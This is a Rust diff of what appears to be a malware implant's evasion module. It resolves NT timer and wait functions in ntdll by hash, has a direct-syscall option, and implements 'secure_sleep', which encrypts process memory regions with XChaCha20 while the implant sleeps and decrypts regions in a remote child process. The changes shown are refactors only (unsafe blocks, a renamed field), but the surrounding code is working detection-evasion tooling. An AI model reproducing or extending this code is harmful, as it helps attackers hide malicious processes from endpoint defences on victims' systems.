@@ -33,7 +33,7 @@ use chacha20::{
     XChaCha20,
 };
 use chacha20poly1305::{
-    aead::{Aead, KeyInit, OsRng},
+    aead::{Aead, AeadInPlace, KeyInit, OsRng},
     XChaCha20Poly1305, XNonce,
 };
 use rand::RngCore;
@@ -1262,23 +1262,25 @@ fn cronus_probe() -> bool {
     #[cfg(not(feature = "direct-syscalls"))]
     {
         // When not using direct syscalls, resolve via pe_resolve.
-        let ntdll = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL);
+        let ntdll = unsafe { pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL) };
         if let Some(base) = ntdll {
-            pe_resolve::get_proc_address_by_hash(
-                base,
-                pe_resolve::hash_str(b"NtSetTimer\0"),
-            )
-            .is_some()
-                && pe_resolve::get_proc_address_by_hash(
+            unsafe {
+                pe_resolve::get_proc_address_by_hash(
                     base,
-                    pe_resolve::hash_str(b"NtCreateTimer\0"),
+                    pe_resolve::hash_str(b"NtSetTimer\0"),
                 )
                 .is_some()
-                && pe_resolve::get_proc_address_by_hash(
-                    base,
-                    pe_resolve::hash_str(b"NtWaitForSingleObject\0"),
-                )
-                .is_some()
+                    && pe_resolve::get_proc_address_by_hash(
+                        base,
+                        pe_resolve::hash_str(b"NtCreateTimer\0"),
+                    )
+                    .is_some()
+                    && pe_resolve::get_proc_address_by_hash(
+                        base,
+                        pe_resolve::hash_str(b"NtWaitForSingleObject\0"),
+                    )
+                    .is_some()
+            }
         } else {
             false
         }
@@ -1631,7 +1633,7 @@ pub unsafe fn secure_sleep(config: &SleepObfuscationConfig) -> Result<()> {
         snapshots.push(RegionSnapshot {
             base,
             size,
-            orig_prot: actual_old,
+            orig_protect: actual_old,
             nonce,
             tags,
             n_chunks,
@@ -1791,7 +1793,7 @@ pub unsafe fn secure_sleep(config: &SleepObfuscationConfig) -> Result<()> {
 
     // Restore original protections.
     for snap in &snapshots {
-        let _ = protect_memory(snap.base, snap.size, snap.orig_prot);
+        let _ = protect_memory(snap.base, snap.size, snap.orig_protect);
     }
 
     // ── 8b. Decrypt remote (child) process regions ────────────────────────
